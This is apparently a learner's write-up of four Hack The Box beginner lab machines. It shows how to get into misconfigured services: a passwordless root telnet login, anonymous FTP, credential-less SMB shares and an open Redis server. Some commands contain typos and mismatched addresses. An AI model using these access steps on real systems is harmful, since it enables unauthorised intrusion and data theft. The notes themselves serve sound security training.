## Hack The Box - Starting point 

### connect to VPN
```
sudo openvpn ./starting-po
```

### Meow
Enumeration: finding target(s) to penetrate, including
- finding target IP address (%)
- finding target port
- learn about the service
(%: However, this scenario is that the IP address is given.)
```
# To test our connection
ping 10.129.23.8

# To enumerate ports
# NOTE: the '-sV' checks for service version
nmap -sV 10.129.23.8
```

After we learned that a telnet service is at port 23
```
telnet 10.129.23.8
```
In the telnet, a login service popped up and we get to login.
After trying some common usernames(e.g. admin, administrator, root),
we can find out that the user "root" requires no password and 
we get to pop a shell interface when we logged in. 
That's where the flag is.


### Fawn
FTP (File Transfer Protocal)
- users may authenticate themselves. 
  - Poorly configured FTP allows anonymous accounts
- client-server model architecture
  - client -----Data-----> Server
  -        <----Data------
- typical scenario
  - TCP at port 21: recieve and send files
  - SSH (Secure Shell Protocal) at port 22: remote management
  - HTTPD (Web Server) at port 80: serve web content 
- e.g. Filezilla
- FTP is often secured with SSL/TLS(FTPS) or SSH-tunneling(SFTP)
  - FTP by itself does have the ability to require credentials before allowing access to the stored files. 
  - However, the deficiency here is that traffic
containing said files can be intercepted with what is known as a Man-in-the-Middle Attack (MitM).
  - FTPS: SSL/TLS FTP
  - SFTP: SSH-tunneling FTP
    - binds survices into SSH port
    - Therefore, secured against any interception (MitM)

As before, we perform the Enumeration steps to learn about target
i.e. ping xxx; nmap xxx;
This time, we learned that there's FTP service. 
A typical misconfiguration for running FTP services allows an 'anonymous' account to access the service like any other authenticated user. The 'anonymous' username can be input when the prompt appears, followed by any password whatsoever since the service will disregard the password for this specific account.
```
# ftp client
ftp 10.129.2.11
```

Using ftp
```
# LOGIN
Name (10.129.2.11:pingjui): anonymous
Password: any_password_will_do

# show files
ftp> ls

# get files
ftp> get flag.txt

# exit
ftp> bye
```
I am not sure whether the scenario is likely or unlikely and whether the account name 'anonymous' is universal for FTP or not.

### 
- SMB (Server Message Block) Protocol
  - one way to transfer a file between two hosts(computers).
  - provides shared access to files, printers, and serial ports between endpoints on a netowrk
  - mostly on Windows machines.
    - typically see port 445 TCP oopen on the target, reserved for the SMB protocol
  - Usually run at the Application or Presentsation layaer of the OSI model
    - therefore, it relies on lwower-level protocols for transport
    - Transport layer that Microsoft SMB protocol is most often used with is **NetBIOS** over **TCP/IP(NBT)**
  - A **share**
    - SMB-enalbed storage on the network
    - can be accessed with address of the server & proper credentials.
    - a network administrator can sometimes make mistakes and therefore,
      - accidentally allow login without any valid credentials
      - using either `guest accounts`or `anonymous log-ons`
- OSI model
  - Physical-DataLink-Network-Transport-Session-Presentation-Application

Enumeration
```
# finding the service
nmap -sV 10.129.186.63 
# PORT    STATE SERVICE       VERSION
# 135/tcp open  msrpc         Microsoft Windows RPC  
# 139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
# 445/tcp open  microsoft-ds?
# Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 

# listing shares, no password required
smbclient -L 10.129.186.63
# ssword for [WORKGROUP\pingjui]:
#
#        Sharename       Type      Comment
#        ---------       ----      -------
#        ADMIN$          Disk      Remote Admin
#        C$              Disk      Default share
#        IPC$            IPC       Remote IPC
#        WorkShares      Disk      
# SMB1 disabled -- no workgroup available

# try all Sharename ()
smbclient \\\\10.128.186.63\\ADMIN$
# tree connect failed: NT_STATUS_ACCESS_DENIED
smblicent \\\\10.128.186.63\\C$
# tree connect failed: NT_STATUS_ACCESS_DENIED
smblicent \\\\10.128.186.63\\WorkShares$
smb: \>  
# We have popped a Smb-shell
```
- NOTE: IPC$ share is of type IPC so it is not browsable nor part of the filesystem


SMB usage
```
# list files
smb: \> ls 

# change directories
smb: \> cd Amy.J

# get files
smb: \> get flag.txt

# exit
smb: \> exit
```


### Redeemer

- Redis (REmote DIctionary Server)
  - an open-source advanced NoSQL key-value data store used as a database, cache, and message broker.
  - In-memory database, store data on RAM
    - typically used for short term storage of data that needs fast retrieval
    - The website may be written to first check if the needed data is in Redis, and if not, then check the traditional
database (like MySQL or MongoDB)

Enumeration
```
# -p-: parse all ports
# this takes very long time 
nmap -p- -sV 10.129.17.127

# redis cli
# -h: specify the host's IP address
redis-cli -h 10.129.17.127
```

Interacting with the redis server
```
# gain information & statistics about the redis server
# the 'keyspace' section shows the available database & its number of keys 
10.129.17.127:6379> info
# ...
# Keyspace
# db0:keys=4,expires=0, avg_ttl=0
# ...
 
# choose the the db with index
10.129.17.127:6379> select 0

# list all key of current db
10.129.17.127:6379> keys *
# "stor", "temp", "numb", "flag"

# get value by key
10.129.17.127:6379> get flag
```

